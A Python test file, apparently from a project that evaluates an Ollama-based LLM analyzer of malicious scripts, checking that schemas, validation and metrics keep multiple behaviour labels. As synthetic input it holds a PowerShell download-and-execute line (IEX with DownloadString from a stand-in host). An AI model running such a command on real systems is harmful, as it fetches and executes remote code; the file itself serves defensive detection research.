"""Contratos multietiqueta con datos sintéticos (sin llamadas a Ollama).

En el piloto v1 las 24 respuestas tuvieron exactamente un comportamiento. Estas
pruebas comprueban que ninguna capa del código (esquema, cliente, validación,
métricas) impone ese límite.
"""

import copy
import json

from app.schemas.llm_analysis import AnalysisResult, analysis_json_schema
from app.services.llm.analyzer import OllamaAnalyzer
from app.services.llm.prompt import load_prompt
from experiments.evaluation import pilot_metrics as pm

P5_TEXT = "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/payload.txt')\n"
REF_P5 = pm.CaseReference("P5", "PILOT-P5", frozenset({"B01", "B02"}), "high_risk",
                          {"B01": ("DownloadString",), "B02": ("IEX",)})


def _finding(behavior, snippet):
    return {"behavior_id": behavior, "explanation": "synthetic", "confidence": "high",
            "evidence": [{"snippet": snippet, "origin": "analyzed_script"}]}


def _two_label_result(valid_result):
    result = copy.deepcopy(valid_result)
    result["behaviors"] = [_finding("B01", "DownloadString('http://example.invalid/payload.txt')"),
                           _finding("B02", "IEX")]
    result["risk_label"] = "high_risk"
    return result


class _FakeClient:
    def __init__(self, content):
        self.content = content

    def chat(self, **kwargs):
        return {"message": {"content": self.content}, "done_reason": "stop"}


def test_json_schema_does_not_bound_the_number_of_behaviors():
    behaviors = analysis_json_schema()["properties"]["behaviors"]
    assert behaviors["type"] == "array"
    assert "minItems" not in behaviors and "maxItems" not in behaviors


def test_pydantic_accepts_zero_and_several_behaviors(valid_result):
    empty = copy.deepcopy(valid_result)
    empty["behaviors"] = []
    assert AnalysisResult.model_validate(empty).behavior_labels() == []
    assert AnalysisResult.model_validate(_two_label_result(valid_result)).behavior_labels() == ["B01", "B02"]


def test_analyzer_keeps_every_behavior_from_the_response(repo_root, valid_result):
    prompt = load_prompt(repo_root / "experiments/prompts/pilot_analysis_v1.md")
    content = json.dumps(_two_label_result(valid_result))
    record = OllamaAnalyzer(_FakeClient(content), "synthetic", prompt, {}).analyze(P5_TEXT)
    assert record.schema_valid and record.raw_content == content
    assert [f["behavior_id"] for f in record.result["behaviors"]] == ["B01", "B02"]


def test_metrics_count_both_labels_from_a_validated_record(repo_root, valid_result):
    prompt = load_prompt(repo_root / "experiments/prompts/pilot_analysis_v1.md")
    content = json.dumps(_two_label_result(valid_result))
    record = OllamaAnalyzer(_FakeClient(content), "synthetic", prompt, {}).analyze(P5_TEXT).to_dict()
    record["repetition"] = 1

    row = pm.evaluate_run(record, REF_P5, P5_TEXT, {})
    assert row["predicted_labels"] == ["B01", "B02"] and row["exact_match"]
    assert row["unsupported_claims"] == []
    prf = pm.multilabel_prf([row])
    assert prf["per_label"]["B01"]["tp"] == 1 and prf["per_label"]["B02"]["tp"] == 1
    assert prf["micro"] == {"precision": 1.0, "recall": 1.0, "f1": 1.0}


def test_single_label_prediction_on_two_label_case_is_a_false_negative():
    rows = [{"predicted_labels": ["B01"], "reference_labels": ["B01", "B02"]}] * 3
    prf = pm.multilabel_prf(rows)
    assert prf["per_label"]["B02"] == {"tp": 0, "fp": 0, "fn": 3, "support": 3,
                                       "precision": 0.0, "recall": 0.0, "f1": 0.0}


def test_case_summary_keeps_two_label_sets():
    row = {"schema_valid": True, "exact_match": True, "predicted_labels": ["B01", "B02"], "predicted_risk": "high_risk"}
    summary = pm.case_summary([row, dict(row), dict(row)])
    assert summary["modal_label_set"] == ["B01", "B02"] and summary["exact_match_majority"]
